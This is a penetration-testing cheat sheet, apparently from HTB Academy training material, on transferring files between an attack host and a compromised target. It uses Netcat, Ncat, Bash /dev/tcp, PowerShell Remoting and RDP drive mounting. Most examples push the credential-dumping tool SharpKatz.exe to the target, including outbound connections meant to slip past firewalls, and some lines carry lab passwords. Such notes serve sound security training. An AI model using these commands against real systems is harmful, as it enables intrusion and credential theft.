
## Netcat

On target machine start nc listener

```
# Example using Original Netcat
nc -l -p 8000 > SharpKatz.exe
```

```
# Example using Ncat
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Sending to target machine from attack machine

```
# Example using Original Netcat
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

```
# Example using Ncat
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

---

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file SharpKatz.exe as input to Netcat.

Attack machine

```
# Example using Original Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

```
# Example using Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

Target machine

```
# Example using Original Netcat
nc 192.168.49.128 443 > SharpKatz.exe
```

```
# Example using Ncat
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

---

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/.

Writing to this particular file makes Bash open a TCP connection to host:port, and this feature may be used for file transfers.

Attack Machine - Sending File as input to Netcat
```
# Example using Original Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

```
# Example using Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

Target Machine - Connecting and Receiving file

```
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

## Powershell Sessions

PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from DC01 to DATABASE01 and vice versa.

We have a session as Administrator in DC01, the user has administrative rights on DATABASE01, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.

### Confirm ports are open

```
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

### Create Session

```
$Session = New-PSSession -ComputerName DATABASE01
```

### Copy file from local to DATABASE01

```
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

### Copy File from DATABASE01 to local

```
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP

### Mount Linux folder using rdesktop

```
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

### Mount Linux folder using xfreerdp

```
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

Then connect to \\\\tsclient\\linux on the RDP machine
